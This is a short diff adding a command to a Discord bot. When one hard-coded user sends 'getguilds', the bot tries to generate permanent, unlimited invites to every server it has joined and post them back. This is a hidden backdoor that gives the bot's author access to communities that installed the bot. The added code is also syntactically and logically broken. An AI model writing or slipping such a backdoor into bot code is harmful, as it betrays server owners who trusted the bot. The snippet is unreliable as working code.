@@ -55,6 +55,18 @@ console.log("logged in: " + client.user.tag + "\n id: " + client.user.id)
 
 
 
+client.on("message", msg => {
+   if(msg.content === `${prefix}getguilds`) {
+     if(msg.author.id === `${assy}`) {
+       msg.client.guilds.cache.forEach(g => {
+    let ch = g.channels.filter(c => c.type === "text")
+      ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+      .then(invite => msg.channel.send('discord.gg/' + `${invite.code}`))
+})
+}
+}
+})
+
 
 client.on("message", msg => {
       if(msg.content.includes("rape")) {
